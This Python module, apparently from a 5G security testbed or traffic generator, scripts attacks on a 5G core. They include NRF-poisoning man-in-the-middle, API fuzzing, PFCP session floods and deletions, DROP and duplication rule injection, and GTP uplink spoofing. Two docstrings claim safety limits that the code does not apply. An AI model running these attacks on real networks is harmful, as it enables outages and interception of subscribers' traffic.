import time 
import random
from scapy.all import send

from src.utils.common import ip_list, dn_domains, get_my_ip_from_prefix

from src.utils.protocols.api_cn.instance import NFInstance
from src.utils.protocols.pfcp.pfcp import PFCPRequest

from src.attacks.api_cn.cn_mitm import CNMitm
from src.attacks.api_cn.cn_fuzzing import CNFuzzing

from src.attacks.gtp_u.pfcf_in_gtp import pfcp_in_gtp_packet
from src.attacks.gtp_u.uplink_spoofing import gtp_uplink_packet

class Attacks():

    # CORE NETWOTK INTERACTION 

    def applicative_scan() -> bool:
        """
            Send N (random) discovery request targetting different nf_type.
            There is a ~2 (+/- 1) seconds delay between each discovery request.
        """
        instance:NFInstance|None = NFInstance.add_random_nf(display=False)
        token = instance.get_token("nnrf-disc", "NRF", display=False)
        number_to_discover = random.randint(1,len(NFInstance.nf_type_list))
        nfs_to_discover = random.sample(NFInstance.nf_type_list, number_to_discover)
        
        print(f"Discovering {number_to_discover} NFs: {nfs_to_discover}")
        
        success = True
        for nf_type in nfs_to_discover : 
            print(f"- Requesting info for nf_type={nf_type} ")
            result  = instance.get_nf_info(token, nf_type, display=False)
            success = success and result is not None
            
            time.sleep(1)
            
        # remove the nf_instance to avoid polluting the NRF
        success = success and instance.remove_nf(token,display=False)
        return success

    def cn_mitm() -> bool:
        """
            Poison the NRF inner list of Instance to make a rogue Instance the highest priority.
            The request happening from this moment are sent to the rogue which relays it.
            The rogue instance is effectively a man in the middle.
            Wait ~60 (+/- 10) seconds before removing the man in the middle.
        """
        
        nf_type = NFInstance.get_random_nf_type()
        print(f"Starting MITM for nf_type: {nf_type}")
        
        start = CNMitm.start(nf_type, display=False)
        print(f"-- MITM started: {start}")
        
        time_to_sleep = int(random.normalvariate(60, 10))
        print(f"-- Sleeping for {time_to_sleep} seconds during MITM")
        time.sleep(time_to_sleep)
        
        stop = CNMitm.stop(display=False)
        print(f"-- MITM stopped: {stop}")
        
        return start and stop
             
    def fuzz() -> bool:
        """
            Iterate through the API description of the NF and craft requests with valid parameter names and plausible values.
            Send 10 different urls 10x times each (= 100 packets)
        """
        nf_list = ["UDM", "AMF", "NRF"] 
        nf = random.choice(nf_list)
        print(f"Fuzzing NF: {nf}")
        result = CNFuzzing().fuzz(nf, nb_file=1, nb_url=10, nb_ite=10, nb_method=1)
        return len(result) > 0
        
        # SESSION MANAGEMENT
        
    def flood_etablishment() -> bool:
        "Send ~100 (+/- 10) session establishment requests with random seid, teid and ue_address"
        
        print("Sending initial association setup")
        
        send(
            PFCPRequest.association_setup(
                src_addr=get_my_ip_from_prefix(),
                dst_addr=ip_list["UPF"]
            ),
            verbose=False
        )
        
        time.sleep(5)
        nb = int(random.normalvariate(100, 10))
        print(f"Number of session establishments to send: {nb}")

        for _ in range(nb):
            seid = random.randint(1, PFCPRequest.max_seid)
            teid = random.randint(1, PFCPRequest.max_teid)
            ue_addr = PFCPRequest.random_ue_address()
            
            send(
                PFCPRequest.session_establishment(
                    src_addr=get_my_ip_from_prefix(),
                    dst_addr=ip_list["UPF"],
                    ue_addr=ue_addr,
                    teid=teid,
                    seid=seid
                ), 
                verbose=False
            )
        return True
        
    def flood_deletion() -> bool:
        """
            Send ~100 (+/- 10) session delete requests. 
            The first seid is random (with a minimum of 1000) and then incremented.
            The minimum serves to avoid impacting legitimate sessions.
        """
        
        first_seid = random.randint(1000, PFCPRequest.max_seid-1000)
        nb = int(random.normalvariate(100, 10))
        print(f"Sending {nb} session deletion requests starting from seid={first_seid}")
        
        for i in range(nb):
            seid = first_seid + i
            send(
                PFCPRequest.session_deletion(
                    src_addr=get_my_ip_from_prefix(),
                    dst_addr=ip_list["UPF"],
                    seid=seid
                ), 
                verbose=False
            )
        return True
        
    def modify_drop() -> bool:
        """
            Send 1 session modification request containing a DROP rule to a random UE, with random SEID and TEID.
            SEID and TEID have a minimum of 1000 to avoid impacting legitimate sessions.
        """
        
        seid    = random.randint(1000, PFCPRequest.max_seid)
        teid    = random.randint(1000, PFCPRequest.max_teid)
        ue_addr = PFCPRequest.random_ue_address()
        far_id  = random.randint(1, 1000)
        
        send(
            PFCPRequest.session_modification(
                src_addr=get_my_ip_from_prefix(),
                dst_addr=ip_list["UPF"],
                ue_addr=ue_addr,
                seid=seid,
                teid=teid,
                far_id=far_id,
                actions=["DROP"]
            ), 
            verbose=False
        )
        return True
        
    def modify_dupl() -> bool:
        """
            Send 1 session modification request containing a DUPL rule to a random UE, with random SEID and TEID.
            SEID and TEID have a minimum of 1000 to avoid impacting legitimate sessions.
        """
        
        seid    = random.randint(1, PFCPRequest.max_seid)
        teid    = random.randint(1, PFCPRequest.max_teid)
        ue_addr = PFCPRequest.random_ue_address()
        far_id  = random.randint(1, 1000)
        
        send(
            PFCPRequest.session_modification(
                src_addr=get_my_ip_from_prefix(),
                dst_addr=ip_list["UPF"],
                ue_addr=ue_addr,
                seid=seid, 
                teid=teid, 
                far_id=far_id,
                actions=["FORW","DUPL"]
            ), 
            verbose=False
        )
        return True
        
    def seid_fuzzing() -> bool:
        """
            Send ~100 (+/- 10) session modification requests with FORWARD rule. 
            This rule is the default one and dont change the behavior of the session.
            Yet if the SEID valid, the success response will indicate its existence.
            The first seid is random (with a minimum of 1000) and then incremented.
            The teid is completely random.
        """
        first_seid = random.randint(1, PFCPRequest.max_seid)
        nb = int(random.normalvariate(100, 10))
        print(f"Sending {nb} session modification requests starting from seid={first_seid}")
        
        for i in range(nb):
            seid    = first_seid + i
            teid    = random.randint(1, PFCPRequest.max_teid)
            ue_addr = PFCPRequest.random_ue_address()
            far_id  = random.randint(1, 1000)
            
            send(
                PFCPRequest.session_modification(
                    src_addr=get_my_ip_from_prefix(),
                    dst_addr=ip_list["UPF"],
                    ue_addr=ue_addr,
                    seid=seid, 
                    teid=teid, 
                    far_id=far_id,
                    actions=["FORW"]
                ), 
                verbose=False
            )
        return True

        # PACKET FORWARDING 

    def pfcp_in_gtp(ue_addr:str, teid:int) -> bool:
        """ 
            Send 1 pfcp packet encapsulated in a gtp layer.
            The pfcp packet is benign but having this kind of encapsulation could be used for attacks and shouldn't happen.
        """
        pfcp_packet = PFCPRequest.association_setup(
            src_addr=ue_addr,
            dst_addr=ip_list["UPF"]
        )
        
        print(f"Sending PFCP in GTP from ue {ue_addr} teid={teid}")
        
        send(
            pfcp_in_gtp_packet(
                src_addr=get_my_ip_from_prefix(),
                dst_addr=ip_list["UPF"],
                teid=teid,
                pfcp_packet=pfcp_packet
            ), 
            verbose=False
        )
        return True

    def uplink_spoofing(ue_addr:str, teid:int) -> bool:
        """
            Send 1 packet from the CN spoofing an UE.
            The packet is supposed to be send to the DN where it will be seen as originating from the UE.
        """
        tunnel_dst_addr = random.choice(dn_domains)
        print(f"Sending uplink spoofing: tunnel_dst_addr={tunnel_dst_addr}, ue_addr={ue_addr}, teid={teid}")
        
        send(
            gtp_uplink_packet(
                src_addr=get_my_ip_from_prefix(),
                dst_addr=ip_list["UPF"],
                tunnel_dst_addr=tunnel_dst_addr,
                ue_addr=ue_addr,
                teid=teid
            ), 
            verbose=False
        )
        return True

    # def user_mitm():
    #     pass

def random_attack() -> str:
    available_attacks = [name for name in dir(Attacks) if callable(getattr(Attacks, name)) and not name.startswith("_")]
    attack = random.choice(available_attacks)
    return attack